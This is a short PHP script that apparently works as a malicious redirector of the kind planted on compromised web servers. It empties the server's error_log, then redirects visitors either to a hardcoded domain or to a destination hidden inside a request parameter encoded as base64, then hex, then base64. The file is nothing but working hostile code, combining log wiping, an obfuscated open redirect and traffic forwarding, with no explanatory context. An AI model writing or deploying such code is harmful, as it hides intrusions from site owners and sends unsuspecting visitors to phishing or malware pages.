<?php
$clean = fopen('error_log', 'w');
fwrite($clean,'');
fclose($clean);

$redir = 'https://sardeath.com';

if(empty($_GET['r']))
{
header("location: $redir");
}else{
$uru = isset($_GET['r']) ? $_GET['r']: null;
$xurl = base64_decode(hex2bin(base64_decode($uru)));
header("Location:".$xurl);
}
?>
